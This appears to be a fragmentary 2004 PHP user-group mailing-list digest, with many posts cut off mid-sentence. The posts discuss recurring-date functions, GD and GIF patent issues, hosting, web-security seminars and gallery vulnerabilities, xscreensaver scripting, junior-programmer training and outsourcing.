atop a directory structure (would probably be 10x easier w/ PHP5's XML facilities.  Just an idea ...

Nice article.

There's one big point that he gets wrong, and that is the suggestion that
Microsoft fixes the security vulnerabilities in IE. I wish I could find
the link (can anyone help me out here?), but there is a site that keeps a
list of the unpatched vulnerabilities in the latest IE, and it always has
plenty (50 or more). If anyone knows the URL, it might be nice to pass it
along to the author.

My favorite quote from this article:

"You know, fool me once, shame on you; fool me twice, shame on me. Who's
shamed when it's "fool me the 432nd time"? Who's the fool?"

The sad truth can be funny sometimes. :-)

And a very good one at that!  I'm already referencing it in a new 
article about using HTML_QuickForm and DB to upload csv files that

I don't know if this is what you are referring to; 
statistically the chances are rather poor -- 
there are thousands of links to articles on the web 
which would substantiate the proposition that 
MS does not fix security holes in I.E. in a timely 
fashion.

<msrant>
I think they should go to jail ... if you look up fraud in the dictionary and 
apply it to IE and what execs say about IE that definition is smack dab right 
there ... 

"An intentional perversion of truth for the purpose of obtaining some valuable 
thing or promise from another."

Bablefish ver. 1.3 translation:

"Let me tell people I applied patches, when I really didn't so I can say IE is 
the best browser out there and continue to integrate more OS crap into an 
already unsafe environment for profit."

I guess those mile-long EULAs do work for something.

I really hope the backlash of application incompatibilties when SP2 is 
released is so bad that people just drop Windows altogether.  
</msrant>

I wonder if PHP is SP2 ready?

You should read some of the tripe entitled (something like):
"The Truth About Open Source Software" from MS.

This is an excellent article and really hits the nail on the end w/ the mysqli 
warning ... *however* ... I still can't figure out a good reason why the class 
is *not* built-in to PHP yet ... I can understand its a changing and evolving 
item but it would really help avoid issues in the future ...

It would be nice to find it (or a variant of some kind) in the SPL.

Hi List.  Has any one installed FreeTDS, specifically on AIX 5.1, for use
with PHP (to enable mssql?).  Or, if any one has some other working
solution.  Any hint is appreciated.

The way in which I am developing the training seminars 
can appear decidedly un-business-like.

The reason behind the (un-business-like) development of the 
series is that I have to be careful how I view the seminars. 
If I look at them too much as a business my competitive spirit 
may get the better of me. 

I am afraid that I might fall into a trap of 
trying to optimize profit contribution etc. and lose 
sight of the real purpose (helping people get information 
which will result in them doing better work). 

This could happen.

Recently I entered a competition where I didn't 
even think about the prize. All I heard was:
"If you answer the following question you can win...".

Since we are on the topic of cosmic retribution, 
I can tell you payback was swift -- I had to 
endure considerable raillery later for 'competing 
just for competition's sake.'

We use a homegrown MVC framework for yamahamusicsoft.com (PHP 4) as well 
as a few other sites.  I love it.  When we want to add a new page we 
just create a few small files and tell them who they need to talk to. 
It makes development of large sites pretty quick and easy.

If you have an IIS server set up for PHP, you can use an #include 
virtual/file directive in an ASP page and give it the name of your PHP 
file.   It will be run through the PHP engine at the point at which you 
included it and return its results to the ASP page for continued 
processing.

Hey all,

I needed to write a function that will tell me the dates of future
events that recurr monthly by day of month.  So for instance, "4th
Tuesday of the month for the next 6 months"

It ended up to be more difficult than I thought and I wanted to run the
function past you guys.  See attached.  Am I missing some clever way of
doing this?  The function seems to work, but another set of eyes would
be helpful - and it depends on UNIX timestamps, so...

The function is called as:

recurMonthlyByDay(2,4,20030522,23);

Which would return an array listing the 4th Tuesday, starting in May of
2003, for the next 23 months.  If you specify the second argument to be
greater than 5, then the last Tuesday would always be returned.


Thanks guys... feel free to use the function, too (that is, if it works)

H

Out of curiosity, why not use PEAR::Calendar?

Seems to enable the kind of logical loops that you are shooting for, right?

This is something I wrote for recurring events
You can choose a date from when the event starts to occur
($month,$day,$year)
and then till when to run($month2,$day2,$year2)
It can run for daily weekly biweekly or monthly.

I hope it helps you out

----------------------------------------------------------------------------
-----------------

//$repeat day is 1 through 7 for each day of the week starting from Monday
you want the even to occur

//$occurence=1 (Daily) 
//=7(weekly) = 
//14(biweekly) 
//=28 (Monthly)

//skip saturday and sunday
$arrskipdays=array(0,6);

//$month,$day,$year is when the events starts to occur and
$month2,$day2,$year2 is until when
//The loop will run for each day of the week requested which is stored in
$repeatday.

foreach ($repeatday as $value)
	{
		//Difference between today and the day the event should
start from.
		$daydiff=$value - intval(date("w",mktime (0,0,0,$month,
$day, $year)));
		
		//if day difference is less than zero than that means that
the day should start from next week.
		if ($daydiff<0) $daydiff+=7;
		
		$counter=0;
		
		//occurring weekly biweekly or monthly.
		while($counter<=$diff) 
		{
			//Only insert if resulting date is less or equal to
the final date.
			if (mktime (0,0,0,$month, ($day + $daydiff +
$counter),  $year)<=mktime(0,0,0,$month2,$day2,$year2))
			{
				if(!in_array(intval(date("w",mktime
(0,0,0,$month, ($day + $counter),  $year))),$arrskipdays))
				{
					echo
date("Y-m-d",mktime(0,0,0,$month, ($day + $daydiff + $counter),  $year));
					$counter=$counter + $occurrence;
				}
			}
		}

I googled for 'calculate third tuesday month' and got some results that 
might help you. They are in all sorts of languages but you should be 
able to pull out a good algorithm.

Well, after an excellent 2.5 hours of practical PHP security training 
from Mr. Shiflett last night (thanks tgaconnect!), I check my email and 
learn that a server exploit has injected malicious js code into footers 
of website pages, with the js designed to exploit an M$ IE flaw, 
secretely downloading the Scob trojan

http://www.microsoft.com/security/incident/download_ject.mspx
and http://www.f-secure.com/weblog/

Wow.... talk about timing!  In hour 2 last night Chris Shiflett 
explained and demonstrated cross site scripting vulnerabilities and 
cross site request forgeries - along with several clever means used by 
villains to get the js code onto  so-called "secure" systems so it could 
be unknowingly redistributed (and of course, we learned how to prevent 
that with good PHP practices :-).

Now I  see a real world example with my morning coffee - that appears to 
have been spawned either just before or during the security course! 
How's that for "enhancing cognitive perseverance" !

(yes, I know this example exploits a server flaw and a crappy browser as 
opposed to sub-optimal PHP coding, but it is remarkable to see a js 
injection so similar to what we went over last night, and it drives home 
the importance of putting the proper PHP in place on our PHP systems - 
to prevent the same attacks)

Well, yes and no.  Their function is limited, ie it won't return a list
of dates that I could tell.  Plus I didn't want to load up 100K+ of code
for something so small :)

Thanks for the links guys... my implmentation is actually very similar
to the VBA script posted (hark!)

One more for you. This one is written in PHP but from what I can tell it 
will only get you the date for the next month.  It shouldn't be too hard 
to change that though.

There is none in PHP GD that I know of, I'm using gif2png utility to do 
that.

Here's one I use, and the price is right...

http://www.edmunds-enterprises.com/linux/hosting_plans.php

frankly, I don't know how they do it for that price, but so far 
so good -- their tech support is excellent in my experience

they support GD.. I've put an phpinfo() call that you can look at:

just hacked this. Needs some error checking before date calculation.
The function signiture is a little different from what you asked ;)
You can get rid of the two array definitions with some more PHP.


function recurMonthlyByDay($dayOfWeek, $week, $startYear, $startMonth, $count) {
	$daysArray = array(	1 => 'Monday', 
			2 => 'Tuesday', 
			3 => 'Wednesday',
			4 => 'Thursday',
			5 => 'Friday',
			6 => 'Saturday',
			7 => 'Sunday');
	$weeksArray = array(1 => 'First',
			2 => 'Second',
			3 => 'Third',
			4 => 'Fourth');
	$result = array();
	for($i = 0; $i < $count; ++$i) {
		$result[] = strtotime("$weeksArray[$week] $daysArray[$dayOfWeek]",
mktime(0,0,0,$startMonth++, 1, $startYear));
	}
	return $result;
}

$dates = recurMonthlyByDay(3, 4, 2004, 5, 23);
foreach ($dates as $date) {
	echo date("l \\t\h\e jS, M Y", $date);
	echo "\n";	
}

I had the same reaction when I saw the news this morning.  Chris / Tim, 
thanks for a great talk last night.  Got a lot out of it.  Amazing how 
you guys arranged for the demonstration this morning.

Guess I will have to go to the rest of the series to be clued in on

It all depends on what libraries you have installed. Many installations 
of the gd library include gif read support.

What is the output of
<?PHP print_r(gd_info()); ?>
on your sever?

The patent that prevents the inclusion of gif support only applies to 
the use of LZW compression when writing a gif, so in general, read 
support is not a problem. Also check out libungif
http://sourceforge.net/projects/libungif
which saves gifs w/o compression avoiding patent issues. Also note that 
the worldwide patent expires on July 7, 2004, so things might turn 
around after then.

Let me see if I follow the sordid details as Jeff opened them...

I am of the understanding that the GIF format is a bitmap compressed with
run-length encoding (RLE). What I don't really have information about is
this: Does Recursive-RLE mean LZW and vice versa? 

Maybe I should re-read or find anew the whitepapers I consumed a couple
years back when I was going to make a realtime palette-rotator for GIF
images. and some more on the Lempel-Ziv and Lempel-Ziv-Welch algorithms. The
sad part is I can remember what the alphabet soup means, and can even
visualize the chunk processing for loading a gif-stream, but I coulnd't tell
you what LZW actually is, or how it applies to GIF formatting.

Also, how does PNG compress itself without using LZW?

Depends on how you ask it to compress -- it supports several schemes. I 
believe compression=6 is gzip but I could be wrong...

Short explanation is that it changes a stream of data like 000000111000 
etc. into 6x0,3x1,3x0 etc. (then represents it again in binary), which 
is usually shorter than the original stream. Note that encoding for 
10101010101010101010101 etc. would actually be longer, but that isn't a 
very common pattern...

> or how it applies to GIF formatting.

As far as I can remember (but I can easily be wrong as I didn't care at 
the time, nor do I now), the patent issues (more than you'll want to 
know about that here:
http://cloanto.com/users/mcb/19950127giflzw.html
), is that the patent restrictions apply to encoding, but not decoding, 
thus Software like Photoshop has to pay a licensing fee, but browsers 
like mozilla don't.

> Also, how does PNG compress itself without using LZW?

I thought the seminar last night went well ...

@ first glance it was a little odd to grasp the concept or possibilities 
of CSRF (which is sometimes difficult when reading a book or googling 
online for information), 9 times out of 10 its worth the time + money to 
get it from the source and I felt Chris Shiflett to be an excellent 
presenter.  

All in all I think Tim's objectives are well meant for the community.

I see there's an ext/php_dio.dll in my PHP 5 win32 snapshot, though not in 
my PHP 4 one.  Get the snapshots at http://snaps.php.net/

I disagree wholeheartedly (and it has nothing to do with bashing). I 
don't see a single excellent point, and I see a ton of misguided 
concepts. He's either a dreamer, delusional, or just a 
glass-half-empty-means-someone's-not-thirsty-anymore optimist with 
little real evidence supporting his "credentials".

Name one instance where M$ released "great software on time" or for that 
matter even "software on time".  Not once I can determine.

It is thehostingcompany.us.  I use them and have been very satisfied.  It 
is not affiliated in any way with NYPHP, but some of the key members of 
NYPHP are affiliated with it (I am not one of them, in case anybody might 
by some wild stretch of the imagination consider me a key member of NYPHP).

$im=@ImageCreateFromjpeg($imgurl))    or      
$im=@ImageCreateFromgif($imgurl);

if ($imgtype=="jpg") {imagejpeg($im,'',85);} else 
{imageTrueColorToPalette($im,1,256);imagepng($im);}

Well NYPHP doesn't provide hosting per se.

However, if you wanted to test out a concept, 
you could write it up as a project.

You could then submit the project for approval.
see: 

http://nyphp.org/content/presentations/nyphp/index.php?slide=9 


(there are three consecutive slides that talk about 
 projects and the approval process)

You may have your system already finished -- 
I mean you might just be looking for a place to 
deploy it -- so in that case the above 
won't really apply.

In that case, let this post just serve as a reminder 
to everyone that it is possible to develop things at NYPHP 
on release candidate software  -- before there is a 
final/stable release of PHP 5 -- through the 
project submission process.

for a few days ive been toying around with the PHP-GTK based IDE

there are a few reasons why i like it ...

a) its php based
b) its pretty new/good start
c) cross platform (w/ speed)
d) gives a great dive/example into OO (extending Gtk objects)

unfortunalty for myself it seems a large majority of the code was
actually hacked using Spanish/Port. (not really an issue), but i had
some thoughts about creating a "security profiling/watching" type of
system ... anyways it unfortunate that i have to jump back into a
j2ee/dynamo job again and didn't find this sooner, but i think "Tulip"
(the english version) needs a good home :-)

who knows, u mix Tulip w/ Glade and you get "Visual PHP" ... :-)

Hey folks,
 
The next LIPHP meeting is Monday 6/28 at 8pm in Hauppauge.  Directions are
here:
 
http://www.liphp.org
 
 
The topic for this evening will be regular expressions.  It has been my
experience that those of us who DIDN'T come from a Perl background tend to
shy away from these, so I figured it would be a good opportunity to "nip
this in the bud".
 
Come on down for some great conversation, plus all the Krispy Kremes you can
eat!
 
See you Monday!
 
Thanks,
 
 
Tom

Wow, Tulip is hot. Is there any alternative/more mature package 
available now that
comes close to this? I like how the SQL testing/management is all 
integrated into the IDE.

I thought 4,5,9 and 12 were intersting.  And point 14 is what MS is all
about, and a major factor in their success... consistent look and feel
and all that stuff.

True, there is some marketing hype in there, but considering the scale
and complexity of having to release Windows, there is some merit in
their song and dance.

Well I didn't mean to imply M$ is sans merit - I agree that would  be 
wrong. But to preach practices which are pie-in-the-sky, and say they 
come from M$ experience, when M$ hasn't succeeded in doing most of it, 
strikes me as incorrect.

I agree completely that some of the points are honorable; I just don't 
see them as practical or based in reality as they should be if they were 
a product of experience. I get annoyed when they are projected as worthy 
because they come from the giant, with an implication that Microsoft 
accomplishes them, when that is generally not true.

You don't need \n, and if you're insistent on using it, the string 
should be double and not single quoted.

I think you need to set the Content-Type to
application/octet-stream

This works for me in Firefox, plain Mozilla, IE, Konqueror and

Subject: [nycphp-talk] secure photo gallery web application
Message-ID: <40E0364F.8040005@ceruleansky.com>

Hello all,

I would like to post some pictures (from the recent Mermaid Parade in 
Coney Island) to my website. I have considered using Gallery for its 
ease of use, but I have some reservations: I have noticed some automated 
bots scanning my sites in attempt to break into them using known 
exploits in commonly used pieces of open source software such as 
PHP-Nuke and Gallery.

Gallery recently had a large security hole patched (this hole enabled 
anyone to log in as an administrative user). Thus due to the widespread 
use of Gallery and the possibility that it has more undiscovered holes, 
I am wary of using it.

I am considering the following: Just writing a small script that will 
read a list of image files from a directory, and then give me the option 
to add captions to them. Once I have specified the captions and pressed 
the submit button, that list of files and captions will be entered into 
the (MySQL) database and exist as a new "album". The files themselves 
will be uploaded via FTP. This seems relatively easy to do. I should be 
able to do a prototype of it fairly quickly.

With a smaller amount of well-looked-over code (that does not include 
any  built-in uploading capability) it might be easier to avoid security 
problems.

But before I spend time creating this, I was wondering if there is a 
less well known and slimmer photo gallery application for the PHP / 
MySQL platform that anyone can recommend.

There is Coppermine ... but I am not sure how good that is.

If not, then I might just write the light gallery manager that I 
mentioned above. I wonder if what I write would be of use to others - 
since programs such as Gallery are very feature-rich; and the typical 
end-user would  much prefer using an insecure feature-rich application 
over a minimalistic secure script. But if there is a need for a secure, 
light alternative to Gallery, then I might release what I create as open 
source.

Best Regards,

- Jay Sheth

Sad I missed the parade :(  Living a 10-minute drive away makes it even 
more disappointing that I managed to miss it!)

I'm in the process of setting up a gallery using the RSGallery module 
for Mambo Open Source (www.mamboserver.com).  There are a couple very 
active security researchers that are working with the Mambo crew over at 
Mosforge.net, and I can say that the security of Mambo is really getting 
solid.

I believe all of the gallery scripts start out with humble ambitions, 
and as more folks use it, more features are requested.  I guess that's 
just the nature of software development in the OSS world ;)

And you are absolutely right about the automated scanners - we have a 
group in Brazil that have specialized in writing scanners for older 
versions of Mambo, and thankfully the Mambopots Project (distributed 
Mambo honeypots) is providing some pretty shocking data.  :(

Hi:

I need to site up an e-commerce solution for a client on a LAMP platform.
I'm considering both X-Cart and Zen Cart and I'm wondering if anyone on the
list has experience, pro or con, with those packages.

I'm also open to other suggestions.

The store is fairly small: 50 - 75 items.  The merchant processing will be
handled through PayPal.

Thanks,

I have a similar piece of code that use where website visitors download 
zipped files...and that works across browsers (and works like a charm).

However, in this case, I'm outputting simple csv...nothing binary.

Quick question that I am looking around for and not seeing much info on.
basically, looking for a way to run a shell script or a php script with
xscreensaver.
i.e. gtk etc, looking at building something similar to the .NET
Terrarium project but in an open scripted way.
Wondering if anyone has any experience with using scripts this way.

OSC is good unless you want to really customize beyond the available
modules.  For one, it does not use templating, so there is a ton of
procedural code mixed with HTML.  Also, at its core it does not have the
best coding style (i.e. some scattered classes, no real framework).

At first glance, I like Interchange's promise http://www.icdevgroup.org/
(note: it's Perl), and am looking for a similar PHP project.

Never liked OSC.

I am using mamboserver (mamboserver.com) for content management and a 
component called phpshop (http://www.mambo-phpshop.net/) for the

I host a lot of people who use gallery, and it seems like every other
month there is a new security patch. I am not sure if there has ever
been a stable version without some sort of gaping exploit. They may
just do this so people will check the website every couple of weeks.

It wouldn't be such a big deal if I didn't have to manually upgrade 8
gallery installations by hand, but it is definitely a pain. I would
only suggest using gallery if you are going to be actively using and
adding new pictures to it.

I wrote something similar to what you are describing a few years ago
for an album of WTC pictures that gets hit heavily, and it's
definitely stood the tests of time. One of the problems ("nice
features") with gallery is that it doesn't use a database. It uses a
plethora of flat files filled with huge serialized arrays. When you
get an extreme amount of traffic on a gallery installation, it can
very easily bring a server to it's knees. So depending on how you plan
on using it, it may be worth it to write a quick script to do what you
want.

Otherwise there are plenty of free applications for both windows and
unix that will take a set of pictures and plop out a static html
"album".

Also just looked at the gallery website, another security issue posted
yesterday.
hoorah!

Okay...
I like stout beers, next meeting :).

Here is how it is done with xscreensaver:
I don't compile with explict cli. so I create my php file (in this case
it can be anything.. i.e. test.php
<? print_r($GLOBALS); ?>

it is in my home dir ~joeldg/projects/screensave/test.php
create a launch file with
`/usr/bin/php /home/joeldg/projects/screensave/mview.php`
chmod +x launch
now as root
ln -s ~joeldg/projects/screensave/launch /usr/lib/xscreensaver/test

cp /usr/share/control-center/screensavers/galaxy.xml
/usr/share/control-center/screensavers/test.xml

gvim /usr/share/control-center/screensavers/test.xml

change galaxy to test

`xscreensaver-demo`
select "test" and "preview"

and it also works with php-gtk apps (tested)

Uh... Joel, I hope you will consider letting us beta-test the PHP 3D

This code works very well, though for images that have any black in them
which originally have a white background
the background of the converted image turns black. What to do there?

I am actually working on getting sprites working right now.
Already have terrain tiles working.

If you are not familiar with Terrarium:
http://www.windowsforms.net/default.aspx?tabIndex=6&tabId=42

You can make creatures: plants, herbivors, carnivors etc.. You have to
write in it's intelligence and terrarium acts as the gateway for
everyone's various creatures to interact. I was looking at the forums
and there have been a few "super" critters that have taken over at
various times until someone creates something to kill it.

There is no mono port available for linux, so I am looking at creating a
terrarium inspired thing.  I am basically swamped all the time, but this
is pretty cool and I can 'find' soe time to mess with it.

There seems to be a lot of new interest in HTML_QuickForm

talk at the May meeting (of NYPHP).

Anyway, there has been a new release:

Are you outputting as png or jpg? When downconverting to 256 colors, you 
might experience pallete rot.
Try $imgtype="'jpg";

Message-ID: <54E7E2AE-C925-11D8-87D6-000A95D78076@duikerbok.com>

I'm working on a project that uses ms sql server. When I use mysql I 
use the "unsigned" property on numeric fields that will only use 
positive values. It looks like ms sql doesn't support this though. It 
looks like I only get a positive range with tinyint and I'm stuck with 
an unusable negative range on smallint, int, and bigint. Is this 
correct?

thanks,
Jose

I downloaded phpDocumentor successfully and am attempting to use it via 
the instructions in the tutorial at 
http://www.phpdoc.org/docs/HTMLSmartyConverter/default/phpDocumentor/tutorial_phpDocumentor.howto.pkg.html#using 


However, to no avail as I attempt

. \phpdoc

Per instructions, my terminal window immediately collapses each time.  
I've also referred to 
http://www.pear.php.net/package/PhpDocumentor/download in the PEAR 
documentation on phpDocumentor as well trying to figure this out, again, 
(no surprise eh?) to no avail.

Has anyone ever used this documenting tool before, if so, I could use a 
bit more guidance than the tutorials seem to give.

Thanx

This may be little help, but: my experience on Windoze was exactly the
same.  If I'm on my Windoze box I have to SSH onto a *nix machine to play
with phpDocumentor.

Perhaps, for some reason, phpDocumentor doesn't play nicely on Windoze.

You run phpDocumentor cli style from a

from a command line prompt)

I will try and spare everyone all the

Subject: [nycphp-talk] suggestions for re-training of a junior VB/.net
	programmer
Message-ID: <9736-20164@sneakemail.com>

I have a friend who hired a junior programmer/relative (!) who has only 
worked with VB and VB/.net on IIS. He  recognizes the need to re-track 
this person onto PHP on his existing LAMP platform.

He wants a short-time-duration (inside 6 months) plan to bring the 
programmer up to speed, so he can assume similar level responsibilities 
on LAMP. The idea is to avoid expensive text-book style training, and 
also avoid 1:1 dedication from the senior people at this stage (he wants 
to get him at least to the junior scripter level first).

I am not sure howmuch of a self-starter this person is, but that is what 
needs to be determined IMHO.

I suggested he send him to NYPHP meetings and have him give briefings to 
the company staff afterwards, perhaps do demos for them, etc.
I want to suggest workshops and training seminars as well.
I would like to refer him to install fests that are newbie-friendly 
(SuSe, BSD, RH ok)
I could even see him benefitting from LAN parties that are *nix based, 
if possible.

Can you all suggest where to look for inside-6-months training / 
experience activities, so I can pass along? Perhaps there is a website 
with local NY/NJ activities like this, or a central listing of local AMP 
user groups?

Jeff Loiselle sent a Wired News story about someone who outsourced his 
own job...

I'm sure my employers feel that I've done the same thing, sometimes.

Them: "So what does this foo() method do?"
Me: "Uhhhh, it should, ummm, you know, foo."
Them: "Uh-huh."
Me: "I haven't looked at that code in weeks, let me get back to you..."

Anyway, what's the difference between this guy and a salesman who makes 
a huge commission by landing a contract that someone else is in charge 
of fulfilling?

Not one, IMO. The battle between domestic and foreign labor seems to be the
rock-bottom of the dot-com bubble having burst. The facts are that foregin
labor markets have always been undermining the efforts of domestic laborers,
regardless of industry or profession.

The thing that has everyone pissed off is that we wish we we worked in an
industry where loyalty counts more than the bottom line.

And it just doesn't. Anyone comfortable in the idea that a successful
business can operate on that moral is either owner of their own business, or
staged for a very rude awakening.

Nothing is wrong with this picture, until his employer realizes that he does
not need the middleman and can outsource the work himself. Then of course
the company who hired this particular employer realizes the same holds true
for him. Why are they paying this employer when they can outsource the work
themselves. Before you know it, the only work left is work helping people
outsource, and eventually once everyone is in the outsourcing business, we
can all run around like real estate agents chasing what little action is
left.

or thinks he can -- whoops missed that gaping security

'useless' middleman to do code reviews and prevent

Give him an old machine, tell him to fdisk and build an intranet on it.  
Pick the distro, however I'd recommend sticking to one of he 'biggies' 
(fedora, debian).  It needs to have mysql, phpMyAdmin, apache and php on 
it for starters.  If he has serious database background I would strongly 
urge getting him into PostgreSQL, as it will provide an environment that 
may be a better fit for his expectations (and possibly yours, although 
YMMV).  PGAdminIII is a great graphical cross-platform tool as well, he 
should be comfortable with that.

Oh, another cool thing would be that when he gets the machine up and 
running, init to runlevel 3 and make it a server - then he will have to 
work remotely through ssh sessions (and could then take on the linux 
desktop at another time).

The books that I can recommend are:

* PHP Anthology (versions I and II) by Harry Fuecks (SitePoint) for PHP 
programming knowledge, strong emphasis on OO methodologies and patterns
* Essential PHP Tools by our very own David Sklar (Apress) also is an 
excellent book, with strong emphasis on leveraging existing libraries 
like PEAR
* Hardening Apache by Tony Mobily (Apress) for webserver configuration 
and logging, and other important fundamentals that go beyond security
* Running Linux by a cast of thousands (O'Reilly) for installing, 
configuring and managing a linux box
* MySQL:  The Definitive Guide to Using, Programming , and Administering 
MySQL 4 by Paul Dubois (Sams) for dealing with that pesky database
* Mastering phpMyAdmin by Marc Delisle (Packt Publishing) for really 
learning how to configure phpMyAdmin (really!)

Not all of these books are essential, however the Anthology series will 
give him an excellent foundation for transitioning his knowledge to PHP 
technologies.  Mastering phpMyAdmin may be less important, but could be 
the hand-holding quickstart to configuring a PHP application for a 
database - and that may be the hand he needs to cross that bridge, 
depending on his comprehension and learning skills.

Classes will only slow down the learning process, and delay your 
assesment of whether he's picking it up or not.  Give him dirty hands, 
with a bunch of attainable goals and something to gloat over when he is 
done; and he will go after it aggressively, or show you that he's not 
really into the challenge at all.

This is all MHO so take it with a grain of salt.  Could be an 
opportunity to kickstart someone's career (in PHPland, at least) at a 
great advantage to you, or a catastrophic diversion of resources!  I 
wish you the best of luck ;)

I see that before I can even finish my "immediate" reply, this is a hot
topic already.  :o) I'm a little new in this group (though I had a great
time at Outback last week's meeting) so I don't know if I'm risking
something here, but I will say that I myself have good experiences and no
philisophical problem with international (and sometimes domestic)
outsourcing.

In my work I am asked to do many things, from office network management and
tech support to application design and coding -- I use mostly PHP to get
done the job of managing and developing our online database, and I use lots
of time and attention taking care of tech support needs in our 30-person
office.  It's been frustrating for me in many cases when I see that the
non-profit I work for has needs in my area but no funds (and perhaps no
vision) to expand my "department" into more than just me.  Recently I've
realized that I can do a lot more in my area by securing a small budget and
then using it to get a lot of my coding done very cheaply.  The benefits are
several for me: 1) I get more good stuff done that I want to do; 2) I learn
more about managing multi-person projects; 3) my whole outlook at the
programming I do is becoming more broad, less home-grown, and less in-grown.
Without this resource, most of these things would probably never happen.

On the philisophical side, I have no problem with work going where it is
best done for the best price.  Of course it's important to know what work
needs to be done and the meaning of "best done" -- you can't outsource
everything because a coder a thousand miles away is not going to know the
ins and outs of your company culture and policy, and he won't have real
ownership of the whole picture.  Tim's got the point:
> ... whoops missed that gaping security
> hole. Maybe we should see if we can get back that
> 'useless' middleman to do code reviews and prevent
> security breaches in the future.

If I think of myself as a coder who writes PHP code to conform to somebody
else's orders, then I'm in danger when coding jobs start moving out of my
reach.  But if I think of myself as a problem-solver who sometimes (or most
of the time) writes code to fullfil a need, then I'm happy as a lark when
the coding jobs can be handed off and I get more time to focus on new
problems to solve or on improving existing solutions.

Alan Miller:

There will always be lots of action left.  The Open Source ideology itself
was decried by some as the impending doom of programming-for-profit. But the
fact is that there are always jobs that require real ownership, real skill,
real creativity and thinking, and those jobs can't be handed off to an
outside bidder, and getting those jobs done well will always be worth enough
to put food on your family's table.

I don't mean to rant, but I hear and am bothered by the "protect our jobs"
idea in many industries, and I think we are probably doing more to hold
ourselves back with that philosophy than actually improve our real quality
of life.

My four cents, I guess.  Hope it's appropriate here.

I agree w/ Tim, its a massive security issue (its been popping up alot
latley, backdoors in routers (come on people, it didnt just "land"
there) ... some bugs have been good ones due to IO (WRT54G) but I dont
think Id trust it 100%.  The funny part is that companies are extremely
reluctant to spend on security.  I would be too if nothing happened, id
feel it as a waste of resources and money for preventitive measures I
didn thave to take.

On the flip side the worry is that we dont want tech to be so closed
that other countries build themselves into superior developers (thus
open trade for the market).  Its a mess :-)

There is a chapter in that book (11 I think) which talks about the PHP
internals which I found very interesting and well explained (that
Chapter should be freely distributed :-)  I end up unfortunatley
skimming more PHP books now for items that are not always found in other
books.

Id recommend that book + the Cookbook (*alot* of people coming from any
programming background can usually find the cookbooks - like Java
Almanac, Perl HowTo, PHP Cookbook) quick reads to give an idea of the
basics (arrays, lists, printing, functions, classes, etc).

I never meant to make the "protect our jobs" argument. In fact I have been
known to outsource a thing or two myself. As for me, it is disheartening to
know that this field in which I have invested so much time and effort into
is going away. It's not surpising, just disheartening.

It is one of the few fields I know of that the longer you are in it, and the
more experience you have, the less money you make, and the less secure your
future is. This of course is not necessarily due to outsourcing, but younger
cheaper workers fresh out of college who are willing to do anything to get
their foot in the door, outsourcing is just the icing on the cake.

Of course the common response is always... "yeah but when the gaping
security hole is found who are they going to call". Not you of course, they
will call the fresh graduate with a focus in Internet Security who is
willing to work for nothing to get their foot in the door, or the overseas
firm with a specialty to solve such problems.

You fortunately are not in a position where your advanced PHP knowledge lies
at the heart of your job, so from your perspective outsourcing is a great
thing. However, the world only needs so many managers.

As for me, I am working very hard to get away from being a developer for
obvious reasons. The way I see it, you can never compete with someone who is
happy to work for less than you feel you are worth. So I plan to shift focus
myself, and get out while the getting is good.

If I am lucky, I too will be able to take advantage of and exploit foreign
workers at will. It's just like Marx pointed out many years ago, if you do
not own the means of production and are in a position to wield that
ownership to your own advantage and exploit others, you are at the butt end
of a system for which you will always get screwed.

All -

I am having some weird issues with Pear Mail.  I've used it several times
before but I have never had a problem like this.

When instantiating the object:

$mail =& Mail::factory('mail');

This is the error I get:

"Warning: Problem with method call - please report this bug in.."

I did a search for this and found that this error is common amongst other
object classes.  I did a search for this string within the PEAR code base
that I have and didn't find it.

Well if you figure the guy gave out $12k of his $65k salary (~20%) ...

12,000 US Dollar = 552,180 Indian Rupee
(12,000 Indian Rupee (INR) = 260.785 US Dollar (USD))

Cost per average apt. @ $100 per month (4,601.50 Indian Rupee)
http://www.viviun.com/AD-1645/ covers a year of rent.

Unfortunatley the remaining amount of salary of the offshorer probably
went to just the rent alone for the year.  :-\

I guess you need to live outside of the US for a while to really
understand the offshoring business.

Yeah, I hope I wasn't putting words in your mouth.  I guess I was probably
responding more to my perception of a common mindset than to your particular
comment.  It may be that many in this group and many in our industry in
general are more broad-minded than that.

I just don't get it.

Why would companies who are being held 
hostage by closed source consulting 
companies want to take on the new burdens 
of creating super explicit level of 
service requirements (sometimes down 
to the module level) and reams and 
reams of technical specifications;  
and then later create acceptance test 
plans which cover minutia.

Why not redirect that effort toward 
creating functional requirements which 
can be used to determine a close match 
to an existing open source product?

If you are going to have to shift your 
focus from code creating to code reviewing 
(for security, quality, etc.) why not use that 
energy on open source code?

I think that this outsourcing thing is 
just a faze. Companies will wake up and 
see that working with Open Source code is 
much more cost effective than getting 
caught up with more closed source code -- 
even when that closed source code is done 
cheaper offshore.

He he - sounds like a plan...

There was an interesting piece in the Village Voice about how there will 
be many many jobs in the future but no careers anymore. Imagine spending 
four years doing a degree and leaving college to find there are no jobs 
in your industry. All those 20-somethings who did computers in the 90s 
are pretty screwed.

I guess there was never really any clear-cut career path for programmers 
- junior -> intermediate -> senior and then you have to stop coding and 
be project leader (or some other hands-off management position). All the 
same, Im appalled people will pay more for a plumber than they will for 
a programmer.

Sorry, I've turned to everyone I know, and everyone I know knows Linux 
now (including me) and not XP.  Barring reconfiguring everything to RH 
(dream, but not reality):

We have two new XP-enabled machines here at work and neither will print 
using our existing HP LaserJet 2200 Series PCL 6.  I downloaded the 
proper drivers from http://www.hp.com and attempted several 
reinstallations of printers, to no avail.

Each time it will attempt to print, only to time out and throw a 
timeout-related error each time it tries to print: "The document has 
failed to print".

Has anyone out there had experience working with both XP and HP LaserJet 
printers? I am on a serious time crunch and have to have this configured 
by morning and I'm stuck!

Help!

Thanx
Phil

I agree, but this awakening may not happen all at once or even fully 
within our lifetime. And I don't think it is cost effectiveness that 
will drive the awakening but a crippling breakdown from an attack on 
Microsoft machines across the world, leaving a large part of the  
business world helpless for a few hours or days. Then, world leaders 
will unite, and mandate Open Source as not an option but as a  world 
security mandate. Back to sleep. zzzzzz

That is the new American entrpreneur. Do it... stop talking about it. 
You know why?

Because once you become a "farmer" you will see how the farming business 
operates. You will learn how it manages risk, how it manages information 
flow, and how it squeezes profits from the channel, the market, the 
government. Then you will see opportunity -- in deploying IT within farming.

You will start to deploy IT in new inovative ways, as a "farmer". Pretty 
soon you will be carvig out a new niche, and the other farmers will be 
following your lead, and the IT revolution will extend deeper into 
farming because of you. And then one day, you will look at the racks of 
servers you have built up in your barn, and say "I'm thinking of getting 
out of IT.... perhaps moving far away and becoming  arafting travel 
guide...."

I am hopeful everyone working for someone else in IT will see the light 
before they are 45 years old, and go their own way. If you are willing 
to take the risk of chucking it all to become a farmer, why not take the 
